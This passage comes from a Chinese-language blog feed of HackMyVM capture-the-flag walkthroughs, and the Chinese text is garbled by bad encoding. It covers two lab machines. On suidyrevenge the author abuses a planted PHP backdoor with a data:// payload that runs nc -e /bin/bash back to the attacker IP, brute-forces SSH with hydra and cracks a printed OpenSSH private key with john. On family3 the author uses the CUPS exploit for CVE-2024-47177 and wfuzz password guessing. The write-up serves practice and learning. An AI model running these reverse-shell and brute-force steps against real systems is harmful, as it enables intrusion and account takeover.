class="keyword">to</span> <span class="keyword">put</span> <span class="number">2</span> backdoors (.php) <span class="keyword">from</span> <span class="keyword">my</span> KALI <span class="keyword">into</span> /supersecure <span class="keyword">to</span> keep <span class="keyword">the</span> access!</span><br><span class="line"></span><br><span class="line">-theuser</span><br><span class="line"></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®è¿™é‡Œçš„æç¤ºä¿¡æ¯ï¼Œtheuseræ”¾äº†ä¸¤ä¸ªåé—¨phpæ–‡ä»¶åœ¨&#x2F;supersecureï¼Œè¿™é‡Œåœ¨æœ¬æœºä¸Šé¢å…ˆçœ‹çœ‹è¿™äº›æ–‡ä»¶æ˜¯ä»€ä¹ˆåå­—</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">ls</span> /usr/share/webshells/php </span><br><span class="line">findsocket  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æœ€åå‘ç°è¿™ä¸ªsimple-backdoor.phpæ˜¯å¯ä»¥ç”¨çš„ï¼Œä½¿ç”¨æ–¹å¼å°±æ˜¯?cmdçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>å‘ç°è¿™ä¸ªç›®å½•ä¸‹é¢æœ‰ä¸¤ä¸ªçš„åé—¨åˆ†åˆ«æ˜¯<br><img src="https://pic1.imgdb.cn/item/67c70bebd0e0a243d40be657.png"><br>ä½†æ˜¯åœ¨è¿™é‡Œåå¼¹shellæ²¡æœ‰æˆåŠŸ<br><img src="https://pic1.imgdb.cn/item/67c70c60d0e0a243d40be67e.png"><br>é‚£å°±å°è¯•å¦å¤–ä¸€ä¸ªåé—¨æ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/67c70ca1d0e0a243d40be681.png"><br>è¿™ä¸ªåé—¨æ–‡ä»¶æ˜¯ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œæ‰€ä»¥å°±æƒ³åˆ°ç”¨phpä¼ªåè®®æ‰§è¡Œå‘½ä»¤<br>æ‹¿åˆ°wwwçš„shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>/supersecure/mysuperbackdoor.php?file=data:<span class="regexp">//</span>text/plain,<span class="variable">%3C</span>?php<span class="variable">%20system</span>(<span class="variable">%2</span>2nc<span class="variable">%20</span>-e<span class="variable">%20</span>/bin/bash<span class="variable">%20192</span><span class="number">.168</span><span class="number">.58</span><span class="number">.11</span><span class="variable">%20123</span>4<span class="variable">%22</span>);</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[<span class="regexp">/usr/s</span>hare/webshells/php]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234        </span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ2"><a href="#ææƒ2" class="headerlink" title="ææƒ2"></a>ææƒ2</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@suidyrevenge</span><span class="symbol">:~/html</span><span class="variable">$ </span>ls</span><br><span class="line">index.html  murdanote.txt  supersecure</span><br><span class="line">www-data<span class="variable">@suidyrevenge</span><span class="symbol">:~/html</span><span class="variable">$ </span>cat murdanote.txt </span><br><span class="line">I always lost my password so <span class="title class_">Im</span> using </span><br><span class="line">one password from rockyou.txt !</span><br><span class="line"></span><br><span class="line">-murda</span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°ä¸€ä¸ªmurdaæç¤ºæ–‡ä»¶ï¼Œæç¤ºæˆ‘ä»¬è¦ç”¨rockyouå­—å…¸çˆ†ç ´å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -l murda -P rockyou.txt ssh://<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">22</span>:<span class="number">36</span>:<span class="number">53</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">14344399</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>   <span class="keyword">login</span>: murda   <span class="keyword">password</span>: iloveyou</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">2</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">2</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">22</span>:<span class="number">37</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure></div>
<p>ç™»å½•åˆ°murda  æœ‰ä¸€ä¸ªsecret.txtæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">murda@suidyrevenge:~$ ls</span><br><span class="line">secret.txt</span><br><span class="line">murda@suidyrevenge:~$ cat secret.txt </span><br><span class="line">I know <span class="literal">that</span> theuser <span class="keyword">is</span> here!</span><br><span class="line">I just got the id_rsa <span class="keyword">from</span> <span class="string">&quot;violent&quot;</span>.</span><br><span class="line">I will put the key <span class="keyword">in</span> a secure place <span class="keyword">for</span> theuser!</span><br><span class="line">I hope he find <span class="literal">it</span>.</span><br><span class="line">Remember <span class="literal">that</span> rockyou.txt <span class="keyword">is</span> your friend!</span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®æç¤ºæ‰¾åˆ°è¿™ä¸ªid_rsa</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">murda@suidyrevenge:~$ find <span class="symbol">/</span> <span class="operator">-</span>name <span class="string">&quot;id_rsa&quot;</span> <span class="operator">-</span>print <span class="number">2</span><span class="operator">&gt;</span><span class="symbol">/dev/null</span></span><br><span class="line"><span class="symbol">/usr/games/id_rsa</span></span><br><span class="line">murda@suidyrevenge:~$ cat <span class="symbol">/usr/games/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDGbexiJO</span><br><span class="line">b7KaTASSyt9yKFAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC<span class="symbol">/9FkJSQol</span></span><br><span class="line">CNgAMG4SeDpKctz5<span class="symbol">/h6ylTx0vT73OzMwYO97HL/tRrfL0gOWV2UNTuOFwg5fBorYZfBgql</span></span><br><span class="line">bVzsIuCitxvoButf59aeoZtLxeUUuUm3G7Q06IvLV2vj<span class="operator">+</span>VgJ2i2tUjXboCcQ0Yv<span class="operator">+</span>Bj9JBC</span><br><span class="line"><span class="operator">+</span><span class="symbol">/6fG9j+ED7Pi42zjm9zNQsPhrwviHptksnKwpsV5KhBNuO3heeZvydX/sudsCCrYXBKoe</span></span><br><span class="line">P8abXDqJYXhjskJupu8Rb0bcLxR1uEIGgsRww7waBaiag65WnXBwTrzjriWFdCJcI2lfdc</span><br><span class="line">l7g<span class="symbol">/b6T5UfxFSzmdNEZvaH/SNvPEpE8bAUW9rcJwwEJZyIrc4z5VAAAD0PmVBELTPOuptO</span></span><br><span class="line"><span class="number">2</span>LGbENxSNYTLn6TqacFrj76WfTo7Q81QdCw9IJ0ruu0ivvtQWAS2CmG7Hq7vE8b<span class="operator">+</span>T6KI8w</span><br><span class="line">sRJkfpON5nr5e<span class="operator">+</span>mfCGD7Gt0WVBaZ1SolbN17XoSNyTNq8jqF9EcwnsqIM8SRWrLERufCCs</span><br><span class="line">SMDJlGb2<span class="symbol">/khum3fgDvI1R7gm0KYQRRJu33qx9ZXHRmCGKvEMV/pSaIJb2JBTQ9N/QcMlVK</span></span><br><span class="line">RGsVC<span class="symbol">/NNhwcWSMQh6DGLmcC+yZvo5lxBnNUibWKNtf2zTx6yep6SwVzvt9Qg5aZ1exIEYa</span></span><br><span class="line"><span class="number">9</span>bmpZCzHVpHHK859U1l0FNJoBFrCiC0CssPv4E<span class="operator">+</span>g1iLA47NXYCeQxpWvZPsqXwr<span class="operator">+</span>J46vR9</span><br><span class="line">UC<span class="operator">+</span>pZHy9bOHc0J<span class="operator">+</span>CTP80vEazyMN0Uko9<span class="symbol">/R2iJ+7GeQgtzoVBt7mqjaoIDljXOQ6YD5F7a8</span></span><br><span class="line"><span class="number">5</span>LvfFgW691eKdoZbGjaALMdV629MHdm6t5KL56YO9bbWlpgvo61iYqrAE2t<span class="operator">+</span>jhlUoQeQ<span class="operator">+</span><span class="number">9</span></span><br><span class="line">cH8fKHVXctRCypsx577qTwnUFtLn<span class="operator">+</span>l3f<span class="operator">+</span>Twl1ulxpV<span class="symbol">/bs497n1a1aDNpAoMJYt0601+3H8</span></span><br><span class="line">qJQQ12QiBEi1CTvt<span class="operator">+</span>W2<span class="symbol">/d1EQeZ+MDUSqFCLDGE34xu6lI+/Wjmv03qBSRvdUK91MX1Lb2n</span></span><br><span class="line">uUZN0OH6pJbmj3oxHSB6ADFetH7bVFXKC4VjTGltoRWD3sH2n5UIcVZZ<span class="operator">+</span><span class="number">1</span>qha3n37U8Q1<span class="symbol">/</span></span><br><span class="line">OVwSqtTE6NbYQsnsydv9plM1xLkacY9<span class="operator">+</span>db35wPBQSVkuiTuENKUbDMIFC8GiFTzshG9Owr</span><br><span class="line"><span class="number">8</span>LvdK<span class="operator">+</span>LSxCrjQcAch7AYFma7IEtkJDHHAC2dwHw<span class="operator">+</span>ojqb510c9d5oBAd<span class="symbol">/vboElE9ZjYbOq2</span></span><br><span class="line">WT9UdY26<span class="symbol">/LOQ1LZVZ9LU3hW+N9zRLgJZz6jfvELGlS2jxNjBVW8+0dGHOBFxu+lHjyZCaA</span></span><br><span class="line">YaUwJvd2lTkoLIH3o7Wog7c69tTtVP39Lx2trFCRtWs0eJIP6bGMsB83nwWzxiRnUKX5<span class="symbol">/3</span></span><br><span class="line">anvv<span class="symbol">/RtCRJoEsSX9vtXJpMnE4ZXO4H7LglGWe/dlIRkF/Pm81FPB+kiuAYbe+CRVIvEC+m</span></span><br><span class="line">dkCybp6<span class="operator">++</span>R<span class="symbol">/Td2GQ/uh3Iz3Q6CbmGEpnjAtUBjizQc4vrPpB0tgsEXpzB5ZAj10IjgK6a+</span></span><br><span class="line"><span class="number">2</span>PIaEbU2nsSic6JT1tN8GOAx3kca<span class="operator">+</span>x94PZ9quSvGxBIjCcre5IC1vDPSl9ltPIZwwvDIbN</span><br><span class="line">ORebGQ41OO<span class="operator">++</span>boyqMUAeWPCp0U16acJ7l<span class="symbol">/copQQcuIZ0mTched3eyetddQ5FMCHv2EbvK5</span></span><br><span class="line">ovZ9EUC8ryJgnq1<span class="operator">/</span><span class="operator">+</span>ECUOutT5q49Q<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>

<p>ç›´æ¥ç”¨è¿™ä¸ªç§é’¥ç™»å½• æç¤ºè¦passphrase ï¼Œæ‰€ä»¥å…ˆç”¨johnç ´è§£ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh2john id_rsa &gt; hash                               </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# john <span class="comment">--wordlist=./rockyou.txt hash                     </span></span><br><span class="line"><span class="keyword">Using</span> <span class="keyword">default</span> <span class="keyword">input</span> <span class="keyword">encoding</span>: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">1</span> (KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]) <span class="keyword">is</span> <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">2</span> (iteration count) <span class="keyword">is</span> <span class="number">16</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> <span class="keyword">abort</span>, almost <span class="keyword">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">ihateu           (id_rsa)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">42</span> DONE (<span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">23</span>:<span class="number">01</span>) <span class="number">0.02329</span>g/s <span class="number">29.07</span>p/s <span class="number">29.07</span>c/s <span class="number">29.07</span>C/s ramona..shirley</span><br><span class="line">Use the &quot;--show&quot; <span class="keyword">option</span> <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line"><span class="keyword">Session</span> completed. </span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°violentçš„å¯†ç æ˜¯<code>ihateu</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">violent<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>find / -user violent -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span> | grep -ivE <span class="string">&quot;sys|run|proc&quot;</span></span><br><span class="line"><span class="regexp">/home/violent</span></span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.bash_logout</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh/authorized</span>_keys</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh/id</span>_rsa.pub</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.bash_history</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.profile</span><br><span class="line"><span class="regexp">/dev/pts</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></div>
<p>æ‰¾äº†ä¸€ä¸‹è¿™ä¸ªç”¨æˆ·ä¹Ÿæ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æœ€åè¿˜æ˜¯è¦å›åˆ°theuserç”¨æˆ·ï¼Œç„¶åå¾—åˆ°suidyç”¨æˆ·çš„æƒé™</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶æœºå¥½å¥‡æ€ªï¼Œè®¾ç½®äº†è¿™ä¹ˆå¤šè¯¯å¯¼é¡¹ï¼Œä½†æ˜¯ä¸€å¼€å§‹å°±å¯ä»¥ç™»å½•theuserç”¨æˆ·ï¼Œæ„Ÿè§‰å®Œå…¨ä¹Ÿæ²¡å¿…è¦ï¼Œç„¶ååé¢åº”è¯¥ææƒéƒ¨åˆ†ä¹Ÿæœ‰ç‚¹bug<br>æˆ‘çŒœæ˜¯å¯¹æ–‡ä»¶å¤§å°æœ‰åˆ¤æ–­çš„ï¼Œä½†æ˜¯æˆ‘ç¨å¾®å†™ä¸‹è®¾ç½®uidçš„cæ–‡ä»¶å¤§å°å°±ä¸€æ ·äº†ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-family3</title>
    <url>/posts/6117.html</url>
    <content><![CDATA[<p>HMV-family3é¶åœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap 192.168.58.62    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>3-<span class="number">07</span> <span class="number">17</span>:<span class="number">01</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.62</span>)</span><br><span class="line">Host is up (<span class="number">0.0069</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>  open  ssh</span><br><span class="line"><span class="number">631</span><span class="symbol">/tcp</span> open  ipp</span><br><span class="line">MAC <span class="params">Address:</span> C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">6.17</span> seconds</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªæˆ‘ä¹‹å‰æ²¡æ€ä¹ˆè§è¿‡çš„ç«¯å£631 ï¼Œ æœäº†ä¸€ä¸‹ippæ˜¯ä¸ªä»€ä¹ˆæœåŠ¡ï¼š<br>äº’è”ç½‘æ‰“å°åè®® (IPP)ï¼Œå¦‚RFC2910å’ŒRFC2911ä¸­æ‰€è§„å®šï¼Œæ˜¯äº’è”ç½‘æ‰“å°çš„åŸºç¡€ã€‚å…¶å¯æ‰©å±•æ€§é€šè¿‡IPP Everywhereç­‰å‘å±•å¾—ä»¥å±•ç¤ºï¼Œæ—¨åœ¨æ ‡å‡†åŒ–ç§»åŠ¨å’Œäº‘æ‰“å°ï¼Œå¹¶å¼•å…¥3D æ‰“å°çš„æ‰©å±•ã€‚åˆ©ç”¨HTTPåè®®ï¼ŒIPP å—ç›Šäºå·²å»ºç«‹çš„å®‰å…¨å®è·µï¼ŒåŒ…æ‹¬åŸºæœ¬&#x2F;æ‘˜è¦è®¤è¯å’ŒSSL&#x2F;TLS åŠ å¯†ã€‚æäº¤æ‰“å°ä½œä¸šæˆ–æŸ¥è¯¢æ‰“å°æœºçŠ¶æ€ç­‰æ“ä½œé€šè¿‡æŒ‡å‘ IPP æœåŠ¡å™¨çš„HTTP POST è¯·æ±‚è¿›è¡Œï¼Œè¯¥æœåŠ¡å™¨åœ¨port 631&#x2F;tcpä¸Šè¿è¡Œã€‚<br>IPP çš„ä¸€ä¸ªè‘—åå®ç°æ˜¯CUPSï¼Œè¿™æ˜¯ä¸€ä¸ªåœ¨å„ç§ Linux å‘è¡Œç‰ˆå’Œ OS X ä¸­æ™®éä½¿ç”¨çš„å¼€æºæ‰“å°ç³»ç»Ÿã€‚å°½ç®¡å…¶æœ‰ç”¨ï¼ŒIPP ä¸ LPD ç±»ä¼¼ï¼Œå¯èƒ½è¢«åˆ©ç”¨é€šè¿‡PostScriptæˆ–PJL æ–‡ä»¶ä¼ è¾“æ¶æ„å†…å®¹ï¼Œçªæ˜¾å‡ºæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚</p>
<p>å°±æ˜¯ä¸€ä¸ªæœ‰æ¼æ´çš„æ‰“å°æœåŠ¡<br>å› ä¸ºè¿™æ˜¯ä¸€ä¸ªåŸºäºhttpçš„æœåŠ¡æ‰€ä»¥è¿˜æ˜¯å¯ä»¥å»è®¿é—®ä¸€ä¸‹ç½‘é¡µ</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p><img src="https://pic1.imgdb.cn/item/67cab7dc066befcec6e04da4.png"><br>è¿™ä¸ªæ˜¯ä¸€ä¸ª IPP æœåŠ¡å™¨ æœäº†ä¸€ä¸‹cupsçš„æ¼æ´ä¹‹åå‘ç°æ¼æ´ç¼–å·æ˜¯CVE-2024-47177 ç„¶ååœ¨githubæ‰¾åˆ°åˆ©ç”¨çš„è„šæœ¬<a href="https://github.com/vulhub/evil-ipp-server">https://github.com/vulhub/evil-ipp-server</a><br>ç„¶åç¼–è¾‘ä¸€ä¸‹è„šæœ¬ä¸­çš„commandï¼Œè¿™é‡Œæˆ‘é€‰æ‹©åå¼¹shell<br><img src="https://pic1.imgdb.cn/item/67cabc2f066befcec6e05216.png"><br>ç„¶åå®‰è£…ippserveråº“</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# pip3 install ippserver --<span class="keyword">break</span>-system-packages</span><br><span class="line">Requirement already satisfied: ippserver in <span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3.<span class="number">12</span>/dist-packages (<span class="number">0.2</span>)</span><br><span class="line">Requirement already satisfied: requests in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> ippserver) (<span class="number">2.32</span>.<span class="number">3</span>)</span><br><span class="line">Requirement already satisfied: certifi&gt;=<span class="number">2017.4</span>.<span class="number">17</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">2024.12</span>.<span class="number">14</span>)</span><br><span class="line">Requirement already satisfied: charset-normalizer&lt;<span class="number">4</span>,&gt;=<span class="number">2</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">3.4</span>.<span class="number">0</span>)</span><br><span class="line">Requirement already satisfied: idna&lt;<span class="number">4</span>,&gt;=<span class="number">2.5</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">3.8</span>)</span><br><span class="line">Requirement already satisfied: urllib3&lt;<span class="number">3</span>,&gt;=<span class="number">1.21</span>.<span class="number">1</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">2.2</span>.<span class="number">3</span>)</span><br><span class="line">WARNING: Running pip as the <span class="string">&#x27;root&#x27;</span> user can result in broken permissions and conflicting behaviour with the system <span class="keyword">package</span> manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https:<span class="comment">//pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# python3 <span class="number">41777</span>.py <span class="number">192.168</span>.<span class="number">58.11</span> <span class="number">192.168</span>.<span class="number">58.62</span></span><br></pre></td></tr></table></figure></div>
<p>æ‰§è¡Œå®Œå‘½ä»¤ä¹‹åä¼šå‘ç°åœ¨printerè¿™é‡Œå¤šäº†ä¸€ä¸ªï¼Œå°±æ˜¯æˆ‘ä»¬çš„æ”»å‡»ip<br><img src="https://pic1.imgdb.cn/item/67cabc9b066befcec6e05291.png"><br>ä½†æ˜¯è¯•äº†åŠå¤©ï¼Œå‘ç°è¿™ä¸ªshellè¿˜æ˜¯å¼¹ä¸å›æ¥ï¼Œçœ‹äº†ä¸‹wpï¼Œå‘ç°æ˜¯èµ°é”™è·¯äº†<br>è¿™ä¸ªç½‘ç«™æœ‰ä¸€ä¸ªadminç•Œé¢ï¼Œéœ€è¦çˆ†ç ´è´¦å·å¯†ç <br><img src="https://pic1.imgdb.cn/item/67cac06e066befcec6e057a5.png"><br>è¿™é‡Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸€ä¸ªmumçš„ç”¨æˆ·åï¼Œç”¨wfuzzçˆ†ç ´ä¸€ä¸‹<br>è¿™é‡Œå…ˆç”¨äº†bpæ‹¦æˆªï¼Œå‘ç°åœ¨ç™»å½•ç•Œé¢æ˜¯ä¸€ä¸ªpostè¯·æ±‚ï¼Œè€Œä¸”å‚æ•°ä¹Ÿå·²çŸ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># wfuzz -c -u http://192.168.58.62:631/admin/ --basic mum:FUZZ -w rockyou.txt -b &#x27;org.cups.sid=f78970dc2347a763ec24e09c013d76bb&#x27; -d &quot;org.cups.sid=df16eb974ff8e01177f03fafe7aa2887&amp;OP=add-printer&quot; -Z --hc 401</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.62:631/admin/</span><br><span class="line">Total requests: 14344392</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                                 </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000001:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;123456&quot;                                                                                </span><br><span class="line">000000003:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;123456789&quot;                                                                             </span><br><span class="line">000000050:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;hannah&quot;                                                                                </span><br><span class="line">000000049:  <span class="number"> 200 </span>      <span class="number"> 100 